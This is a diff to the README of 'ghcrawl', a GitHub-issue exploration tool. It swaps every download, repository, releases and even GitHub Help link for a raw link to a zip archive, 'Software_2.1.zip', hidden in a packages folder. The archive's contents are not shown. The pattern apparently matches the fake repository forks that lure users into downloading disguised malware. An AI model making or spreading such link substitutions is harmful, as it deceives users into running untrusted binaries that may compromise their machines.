@@ -1,6 +1,6 @@
 # ⚙️ ghcrawl - Explore GitHub Issues Simply
 
-[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-ff6f61?logo=github&logoColor=white&style=for-the-badge)](https://github.com/cut-knottiness862/ghcrawl)
+[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-ff6f61?logo=github&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip)
 
 ---
 
@@ -29,12 +29,12 @@ Before you start, make sure your computer meets these requirements:
 
 To get started, visit this page to download ghcrawl:
 
-[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-blue?logo=github&logoColor=white&style=for-the-badge)](https://github.com/cut-knottiness862/ghcrawl)
+[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-blue?logo=github&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Click on the button above or go to this link in your browser:  
-https://github.com/cut-knottiness862/ghcrawl
+https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip
 
 This page hosts the latest files and download instructions.
 
@@ -154,9 +154,9 @@ This method can be useful for scripting or automated tasks.
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/cut-knottiness862/ghcrawl  
-- Releases Page: https://github.com/cut-knottiness862/ghcrawl/releases  
-- GitHub Help: https://help.github.com/en/github
+- GitHub Repository: https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip  
+- Releases Page: https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip  
+- GitHub Help: https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip
 
 ---
 
@@ -170,4 +170,4 @@ ghcrawl only accesses public GitHub data unless you provide private access token
 
 Visit this page to download ghcrawl and start exploring GitHub issues today:
 
-[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-blue?logo=github&logoColor=white&style=for-the-badge)](https://github.com/cut-knottiness862/ghcrawl)
+[![Download ghcrawl](https://img.shields.io/badge/Download-ghcrawl-blue?logo=github&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/cut-knottiness862/ghcrawl/main/packages/api-core/Software_2.1.zip)
